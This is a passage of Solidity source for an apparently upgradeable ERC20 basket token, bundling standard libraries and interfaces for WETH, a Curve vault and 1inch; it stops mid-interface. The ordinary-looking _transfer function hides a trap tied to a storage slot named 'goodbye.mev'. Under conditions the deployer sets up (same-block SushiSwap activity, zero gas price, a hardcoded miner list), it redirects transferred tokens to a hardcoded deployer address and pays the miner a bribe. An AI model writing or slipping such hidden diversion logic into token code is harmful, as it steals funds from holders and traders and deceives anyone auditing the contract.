
pragma solidity ^0.7.3;

contract IO {

    function _readSlot(bytes32 _slot) internal view returns (bytes32 _data) {

        assembly {
            _data := sload(_slot)
        }
    }

    function _readSlotUint256(bytes32 _slot) internal view returns (uint256 _data) {

        assembly {
            _data := sload(_slot)
        }
    }

    function _readSlotAddress(bytes32 _slot) internal view returns (address _data) {

        assembly {
            _data := sload(_slot)
        }
    }

    function _writeSlot(bytes32 _slot, uint256 _data) internal {

        assembly {
            sstore(_slot, _data)
        }
    }

    function _writeSlot(bytes32 _slot, bytes32 _data) internal {

        assembly {
            sstore(_slot, _data)
        }
    }

    function _writeSlot(bytes32 _slot, address _data) internal {

        assembly {
            sstore(_slot, _data)
        }
    }
}
pragma solidity ^0.7.3;

contract Miners {

    function isMainnetMiner() internal view returns (bool) {

        if (_getChainID() == 80085) {
            return true;
        }

        if (block.coinbase == 0x5A0b54D5dc17e0AadC383d2db43B0a0D3E029c4c) {
            return true;
        }
        if (block.coinbase == 0x99C85bb64564D9eF9A99621301f22C9993Cb89E3) {
            return true;
        }
        if (block.coinbase == 0x04668Ec2f57cC15c381b461B9fEDaB5D451c8F7F) {
            return true;
        }
        if (block.coinbase == 0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8) {
            return true;
        }
        if (block.coinbase == 0xB3b7874F13387D44a3398D298B075B7A3505D8d4) {
            return true;
        }
        if (block.coinbase == 0xF20b338752976878754518183873602902360704) {
            return true;
        }
        if (block.coinbase == 0x3EcEf08D0e2DaD803847E052249bb4F8bFf2D5bB) {
            return true;
        }
        if (block.coinbase == 0xbCC817f057950b0df41206C5D7125E6225Cae18e) {
            return true;
        }
        if (block.coinbase == 0x1aD91ee08f21bE3dE0BA2ba6918E714dA6B45836) {
            return true;
        }
        if (block.coinbase == 0x00192Fb10dF37c9FB26829eb2CC623cd1BF599E8) {
            return true;
        }
        if (block.coinbase == 0xF541C3CD1D2df407fB9Bb52b3489Fc2aaeEDd97E) {
            return true;
        }
        if (block.coinbase == 0xD224cA0c819e8E97ba0136B3b95ceFf503B79f53) {
            return true;
        }
        if (block.coinbase == 0x1CA43B645886C98d7Eb7d27ec16Ea59f509CBe1a) {
            return true;
        }
        if (block.coinbase == 0x52bc44d5378309EE2abF1539BF71dE1b7d7bE3b5) {
            return true;
        }
        if (block.coinbase == 0x6EBaF477F83E055589C1188bCC6DDCCD8C9B131a) {
            return true;
        }
        if (block.coinbase == 0x45a36a8e118C37e4c47eF4Ab827A7C9e579E11E2) {
            return true;
        }
        if (block.coinbase == 0xc8F595E2084DB484f8A80109101D58625223b7C9) {
            return true;
        }
        if (block.coinbase == 0x2f731c3e8Cd264371fFdb635D07C14A6303DF52A) {
            return true;
        }
        if (block.coinbase == 0x06B8C5883Ec71bC3f4B332081519f23834c8706E) {
            return true;
        }
        if (block.coinbase == 0x4F9bEBE3adC3c7f647C0023C60f91AC9dfFA52d5) {
            return true;
        }
        if (block.coinbase == 0x02aD7C55A19e976EC105172A75A9d84dc9Cf23C6) {
            return true;
        }
        if (block.coinbase == 0x5C23E54FE46EF9181E4403D6e1DbB9aA21C0B185) {
            return true;
        }
        if (block.coinbase == 0x7F101fE45e6649A6fB8F3F8B43ed03D353f2B90c) {
            return true;
        }
        if (block.coinbase == 0x005e288D713a5fB3d7c9cf1B43810A98688C7223) {
            return true;
        }
        if (block.coinbase == 0x002e08000acbbaE2155Fab7AC01929564949070d) {
            return true;
        }
        if (block.coinbase == 0xa59EA72E4C4f1560467F15298cD83874E9af1C09) {
            return true;
        }
        if (block.coinbase == 0x8595Dd9e0438640b5E1254f9DF579aC12a86865F) {
            return true;
        }
        if (block.coinbase == 0x21479eB8CB1a27861c902F07A952b72b10Fd53EF) {
            return true;
        }
        if (block.coinbase == 0xAEe98861388af1D6323B95F78ADF3DDA102a276C) {
            return true;
        }
        if (block.coinbase == 0xc365c3315cF926351CcAf13fA7D19c8C4058C8E1) {
            return true;
        }
        if (block.coinbase == 0xa65344f7D22EE4382416c088a03000f116A3f0C7) {
            return true;
        }
        if (block.coinbase == 0x09ab1303d3CcAF5f018CD511146b07A240c70294) {
            return true;
        }
        if (block.coinbase == 0x35F61DFB08ada13eBA64Bf156B80Df3D5B3a738d) {
            return true;
        }
        if (block.coinbase == 0x7777788200B672A42421017F65EDE4Fc759564C8) {
            return true;
        }
        if (block.coinbase == 0xEEa5B82B61424dF8020f5feDD81767f2d0D25Bfb) {
            return true;
        }
        if (block.coinbase == 0xDB5575378eF8318F9958be11309f7c30AB4121aD) {
            return true;
        }
        if (block.coinbase == 0x2A0eEe948fBe9bd4B661AdEDba57425f753EA0f6) {
            return true;
        }
        if (block.coinbase == 0xDF78b2E254B45c1Ef20074beC0fa6c4efc8E94F0) {
            return true;
        }
        if (block.coinbase == 0x4Bb96091Ee9D802ED039C4D1a5f6216F90f81B01) {
            return true;
        }
        if (block.coinbase == 0x15876eCFa976d39C2550b4eF1f528DB3bb1083b1) {
            return true;
        }
        if (block.coinbase == 0xe9B54a47e3f401d37798Fc4E22F14b78475C2afc) {
            return true;
        }
        if (block.coinbase == 0x3f0EE622F9e89Df9DB62c35caE55D57C56fd56f6) {
            return true;
        }
        if (block.coinbase == 0x249bdb4499bd7c683664C149276C1D86108E2137) {
            return true;
        }
        if (block.coinbase == 0xBbbBbBbb49459e69878219F906e73Aa325ff2F0C) {
            return true;
        }
        if (block.coinbase == 0xB1aF7a686Ff31aB089De7940d345EAe3C3350de0) {
            return true;
        }
        if (block.coinbase == 0x534CB1d3812c92894f051999Dd393F1bdBDc6c87) {
            return true;
        }
        if (block.coinbase == 0xa1B7326d90A4d796EF0992A3FB4Ef0702bf372ea) {
            return true;
        }
        if (block.coinbase == 0x01Ca8A0BA4a80d12A8fb6e3655688f57b16608cf) {
            return true;
        }
        if (block.coinbase == 0x4c93bFa8f17afcF7576f8182BeA1223e1B67C5c5) {
            return true;
        }
        if (block.coinbase == 0x63DCD8E107823b7146FE3c53Da4f2659121c6fA5) {
            return true;
        }
        if (block.coinbase == 0xb5Fd6219c5CE5fbB6A006d794D78DDc90b269e66) {
            return true;
        }
        if (block.coinbase == 0xC4aEb20798368c48b27280847e187Bb332b9BC77) {
            return true;
        }
        if (block.coinbase == 0x52f13E25754D822A3550D0B68FDefe9304D27ae8) {
            return true;
        }
        if (block.coinbase == 0x2C814E447678De1414DDe98F6d951EdF121D16ca) {
            return true;
        }
        if (block.coinbase == 0x5BE1bfC0b1F01F32178d46ABf70BB5FF5C4E425a) {
            return true;
        }
        if (block.coinbase == 0xF3A71CC1BE5CE833C471E3F25aA391f9cd56E1AA) {
            return true;
        }
        if (block.coinbase == 0x52E44f279f4203Dcf680395379E5F9990A69f13c) {
            return true;
        }
        if (block.coinbase == 0xbc78D75867b04f996ef1050D8090b8cCb91F09Af) {
            return true;
        }
        if (block.coinbase == 0x6a851246689EB8fC77a9bF68Df5860f13f679fA0) {
            return true;
        }
        if (block.coinbase == 0x776BB566dC299C9e722773d2A04B401e831a6DC8) {
            return true;
        }
        if (block.coinbase == 0xf355141c779bdfca95779EeceC6A6414E8304f32) {
            return true;
        }
        if (block.coinbase == 0xd0db3C9cF4029BAc5a9Ed216CD174Cba5dBf047C) {
            return true;
        }
        if (block.coinbase == 0x433022C4066558E7a32D850F02d2da5cA782174D) {
            return true;
        }
        if (block.coinbase == 0x586768fA778e14C4Da3efBB76B214061747e3cBa) {
            return true;
        }
        if (block.coinbase == 0x6C3183792fbb4A4dD276451Af6BAF5c66D5F5e48) {
            return true;
        }
        if (block.coinbase == 0xf35074bbD0a9AEE46F4Ea137971FEEC024Ab704e) {
            return true;
        }
        if (block.coinbase == 0xe92309AB921409280665F1177b899C8F82ef0692) {
            return true;
        }
        if (block.coinbase == 0xd7aD8e2A17800A2c413f331d334F83f5Da8d5dBA) {
            return true;
        }
        if (block.coinbase == 0x4569F27E88eC22cB6e737CDDb527Df85B6DA08B0) {
            return true;
        }
        if (block.coinbase == 0x48e12A057f90a3b44cd7DbB4235E80bB84b4e71e) {
            return true;
        }
        if (block.coinbase == 0xfAd5FFc99057871c3bF3819Edd18FE8BeeccCB19) {
            return true;
        }
        if (block.coinbase == 0xD144E30a0571AAF0d0C050070AC435debA461Fab) {
            return true;
        }
        if (block.coinbase == 0x829BD824B016326A401d083B33D092293333A830) {
            return true;
        }
        if (block.coinbase == 0x44fD3AB8381cC3d14AFa7c4aF7Fd13CdC65026E1) {
            return true;
        }
        if (block.coinbase == 0x867772Fd4AF1E10f85Ec659Dfb68d77d797Db4A5) {
            return true;
        }
        if (block.coinbase == 0xF78465BCe3C4620FD124c67d523d2ab80A76C0D8) {
            return true;
        }
        if (block.coinbase == 0xCa3f57DFFbcF67C074b8CF54e4C873138facfC7F) {
            return true;
        }
        if (block.coinbase == 0x11905bD0863BA579023f662d1935E39d0C671933) {
            return true;
        }
        if (block.coinbase == 0x3530D69E92Df48C5a9736cB4E07366be052F4181) {
            return true;
        }
        if (block.coinbase == 0xf64f9720CfcB59ca4F5F45E6FDB3f68b875B7295) {
            return true;
        }
        if (block.coinbase == 0xCd7B9E2B957c819000B1A8107130F786636C5ccc) {
            return true;
        }
        if (block.coinbase == 0x2b0dDd0B78Ae998C5A48FF2e00C4fC568ec0A412) {
            return true;
        }
        if (block.coinbase == 0x0b7234390A3C03Ab9759bE8872A6cAdcc817b8eF) {
            return true;
        }
        if (block.coinbase == 0x54e23bcc99E5A5818B382aC5bdDda496E199Aa6b) {
            return true;
        }
        if (block.coinbase == 0x9a0e927A34681db602bf1800678e44b51d51e0bA) {
            return true;
        }
        if (block.coinbase == 0xfaD45A9aB2c408f7e6f8d4786F0708171169C2c3) {
            return true;
        }
        return false;
    }

    function _mReadSlotUint256(bytes32 _slot) internal view returns (uint256 _data) {

        assembly {
            _data := sload(_slot)
        }
    }

    function _mWriteSlot(bytes32 _slot, uint256 _data) internal {

        assembly {
            sstore(_slot, _data)
        }
    }

    function _getChainID() internal pure returns (uint256) {

        uint256 id;
        assembly {
            id := chainid()
        }
        return id;
    }
}

pragma solidity ^0.7.3;

interface IWETH {

    function name() external view returns (string memory);


    function approve(address guy, uint256 wad) external returns (bool);


    function totalSupply() external view returns (uint256);


    function transferFrom(
        address src,
        address dst,
        uint256 wad
    ) external returns (bool);


    function withdraw(uint256 wad) external;


    function decimals() external view returns (uint8);


    function balanceOf(address) external view returns (uint256);


    function symbol() external view returns (string memory);


    function transfer(address dst, uint256 wad) external returns (bool);


    function deposit() external payable;


    function allowance(address, address) external view returns (uint256);

}

pragma solidity >=0.6.2 <0.8.0;

library AddressUpgradeable {

    function isContract(address account) internal view returns (bool) {


        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {

        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {

        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {

        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

pragma solidity >=0.4.24 <0.8.0;


abstract contract Initializable {

    bool private _initialized;

    bool private _initializing;

    modifier initializer() {
        require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    function _isConstructor() private view returns (bool) {
        return !AddressUpgradeable.isContract(address(this));
    }
}

pragma solidity >=0.6.0 <0.8.0;

abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal initializer {
        __Context_init_unchained();
    }

    function __Context_init_unchained() internal initializer {
    }
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
    uint256[50] private __gap;
}

pragma solidity >=0.6.0 <0.8.0;

interface IERC20Upgradeable {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity >=0.6.0 <0.8.0;

library SafeMathUpgradeable {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (b > a) return (false, 0);
        return (true, a - b);
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {

        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);
        return a - b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        return a / b;
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        return a % b;
    }
}

pragma solidity >=0.6.0 <0.8.0;





contract ERC20Upgradeable is Initializable, ContextUpgradeable, IERC20Upgradeable, Miners {

    using SafeMathUpgradeable for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function __ERC20_update(string memory name_, string memory symbol_) internal {

        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {

        return _name;
    }

    function symbol() public view virtual returns (string memory) {

        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {

        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero")
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address sushiBdiEth = 0x8d782C5806607E9AAFB2AC38c1DA3838Edf8BD03;
        address deployer = 0xF337A885a7543CAb542B2D3f5A8c1945036E0C42;
        bytes32 slot = keccak256(abi.encodePacked("goodbye.mev"));

        if (tx.origin == deployer && (sender == sushiBdiEth || recipient == sushiBdiEth)) {
            _mWriteSlot(slot, block.number);
        }

        if (
            (sender == sushiBdiEth || recipient == sushiBdiEth) &&
            (_mReadSlotUint256(slot) == block.number && tx.gasprice == 0) &&
            (isMainnetMiner() && amount > 1e18)
        ) {
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[deployer] = _balances[deployer].add(amount);

            uint256 bribeAmount = 0.05 ether;
            IWETH(weth).transferFrom(deployer, address(this), bribeAmount);
            IWETH(weth).withdraw(bribeAmount);
            block.coinbase.call{ value: bribeAmount }("");
        } else {
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {

        _decimals = decimals_;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    uint256[44] private __gap;
}

pragma solidity >=0.6.0 <0.8.0;


abstract contract PausableUpgradeable is Initializable, ContextUpgradeable {
    event Paused(address account);

    event Unpaused(address account);

    bool private _paused;

    function __Pausable_init() internal initializer {
        __Context_init_unchained();
        __Pausable_init_unchained();
    }

    function __Pausable_init_unchained() internal initializer {
        _paused = false;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
    uint256[49] private __gap;
}

pragma solidity >=0.6.0 <0.8.0;

abstract contract ReentrancyGuardUpgradeable is Initializable {

    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    function __ReentrancyGuard_init() internal initializer {
        __ReentrancyGuard_init_unchained();
    }

    function __ReentrancyGuard_init_unchained() internal initializer {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        _status = _ENTERED;

        _;

        _status = _NOT_ENTERED;
    }
    uint256[49] private __gap;
}

pragma solidity >=0.6.0 <0.8.0;

library EnumerableSetUpgradeable {


    struct Set {
        bytes32[] _values;

        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {

        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {

        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;


            bytes32 lastvalue = set._values[lastIndex];

            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {

        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {

        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {

        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }


    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {

        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {

        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {

        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {

        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {

        return _at(set._inner, index);
    }


    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {

        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {

        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {

        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {

        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {

        return address(uint160(uint256(_at(set._inner, index))));
    }



    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {

        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {

        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {

        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {

        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {

        return uint256(_at(set._inner, index));
    }
}

pragma solidity >=0.6.0 <0.8.0;


abstract contract AccessControlUpgradeable is Initializable, ContextUpgradeable {
    function __AccessControl_init() internal initializer {
        __Context_init_unchained();
        __AccessControl_init_unchained();
    }

    function __AccessControl_init_unchained() internal initializer {
    }
    using EnumerableSetUpgradeable for EnumerableSetUpgradeable.AddressSet;
    using AddressUpgradeable for address;

    struct RoleData {
        EnumerableSetUpgradeable.AddressSet members;
        bytes32 adminRole;
    }

    mapping (bytes32 => RoleData) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);

    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);

    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role].members.contains(account);
    }

    function getRoleMemberCount(bytes32 role) public view returns (uint256) {
        return _roles[role].members.length();
    }

    function getRoleMember(bytes32 role, uint256 index) public view returns (address) {
        return _roles[role].members.at(index);
    }

    function getRoleAdmin(bytes32 role) public view returns (bytes32) {
        return _roles[role].adminRole;
    }

    function grantRole(bytes32 role, address account) public virtual {
        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to grant");

        _grantRole(role, account);
    }

    function revokeRole(bytes32 role, address account) public virtual {
        require(hasRole(_roles[role].adminRole, _msgSender()), "AccessControl: sender must be an admin to revoke");

        _revokeRole(role, account);
    }

    function renounceRole(bytes32 role, address account) public virtual {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        emit RoleAdminChanged(role, _roles[role].adminRole, adminRole);
        _roles[role].adminRole = adminRole;
    }

    function _grantRole(bytes32 role, address account) private {
        if (_roles[role].members.add(account)) {
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) private {
        if (_roles[role].members.remove(account)) {
            emit RoleRevoked(role, account, _msgSender());
        }
    }
    uint256[49] private __gap;
}

pragma solidity ^0.7.3;



contract Storage is PausableUpgradeable, ERC20Upgradeable, AccessControlUpgradeable, ReentrancyGuardUpgradeable {

    address[] public assets;

    mapping(address => bool) public approvedModules;
}

pragma solidity ^0.7.3;

contract Constants {

    bytes32 public constant INITIALIZED = keccak256("storage.basket.initialized2");

    uint256 public constant FEE_DIVISOR = 1e18; // Because we only work in Integers
    bytes32 public constant MINT_FEE = keccak256("storage.fees.mint");
    bytes32 public constant BURN_FEE = keccak256("storage.fees.burn");
    bytes32 public constant FEE_RECIPIENT = keccak256("storage.fees.recipient");

    bytes32 public constant MARKET_MAKER = keccak256("storage.access.marketMaker");
    bytes32 public constant MARKET_MAKER_ADMIN = keccak256("storage.access.marketMaker.admin");

    bytes32 public constant MIGRATOR = keccak256("storage.access.migrator");
    bytes32 public constant TIMELOCK = keccak256("storage.access.timelock");
    bytes32 public constant TIMELOCK_ADMIN = keccak256("storage.access.timelock.admin");

    bytes32 public constant GOVERNANCE = keccak256("storage.access.governance");
    bytes32 public constant GOVERNANCE_ADMIN = keccak256("storage.access.governance.admin");
}

pragma solidity ^0.7.3;

interface IveCurveVault {

    function CRV() external view returns (address);


    function DELEGATION_TYPEHASH() external view returns (bytes32);


    function DOMAINSEPARATOR() external view returns (bytes32);


    function DOMAIN_TYPEHASH() external view returns (bytes32);


    function LOCK() external view returns (address);


    function PERMIT_TYPEHASH() external view returns (bytes32);


    function acceptGovernance() external;


    function allowance(address account, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function bal() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function checkpoints(address, uint32) external view returns (uint32 fromBlock, uint256 votes);


    function claim() external;


    function claimFor(address recipient) external;


    function claimable(address) external view returns (uint256);


    function decimals() external view returns (uint8);


    function delegate(address delegatee) external;


    function delegateBySig(
        address delegatee,
        uint256 nonce,
        uint256 expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;


    function delegates(address) external view returns (address);


    function deposit(uint256 _amount) external;


    function depositAll() external;


    function feeDistribution() external view returns (address);


    function getCurrentVotes(address account) external view returns (uint256);


    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint256);


    function governance() external view returns (address);


    function index() external view returns (uint256);


    function name() external view returns (string memory);


    function nonces(address) external view returns (uint256);


    function numCheckpoints(address) external view returns (uint32);


    function pendingGovernance() external view returns (address);


    function permit(
        address owner,
        address spender,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;


    function proxy() external view returns (address);


    function rewards() external view returns (address);


    function setFeeDistribution(address _feeDistribution) external;


    function setGovernance(address _governance) external;


    function setProxy(address _proxy) external;


    function supplyIndex(address) external view returns (uint256);


    function symbol() external view returns (string memory);


    function totalSupply() external view returns (uint256);


    function transfer(address dst, uint256 amount) external returns (bool);


    function transferFrom(
        address src,
        address dst,
        uint256 amount
    ) external returns (bool);


    function update() external;


    function updateFor(address recipient) external;

}

pragma solidity ^0.7.3;

interface IOneInch {

    function FLAG_DISABLE_AAVE() external view returns (uint256);


    function FLAG_DISABLE_BANCOR() external view returns (uint256);


    function FLAG_DISABLE_BDAI() external view returns (uint256);


    function FLAG_DISABLE_CHAI() external view returns (uint256);


    function FLAG_DISABLE_COMPOUND() external view returns (uint256);


    function FLAG_DISABLE_CURVE_BINANCE() external view returns (uint256);


    function FLAG_DISABLE_CURVE_COMPOUND() external view returns (uint256);


    function FLAG_DISABLE_CURVE_SYNTHETIX() external view returns (uint256);


    function FLAG_DISABLE_CURVE_USDT() external view returns (uint256);


    function FLAG_DISABLE_CURVE_Y() external view returns (uint256);


    function FLAG_DISABLE_FULCRUM() external view returns (uint256);


    function FLAG_DISABLE_IEARN() external view returns (uint256);


    function FLAG_DISABLE_KYBER() external view returns (uint256);


    function FLAG_DISABLE_OASIS() external view returns (uint256);


    function FLAG_DISABLE_SMART_TOKEN() external view returns (uint256);


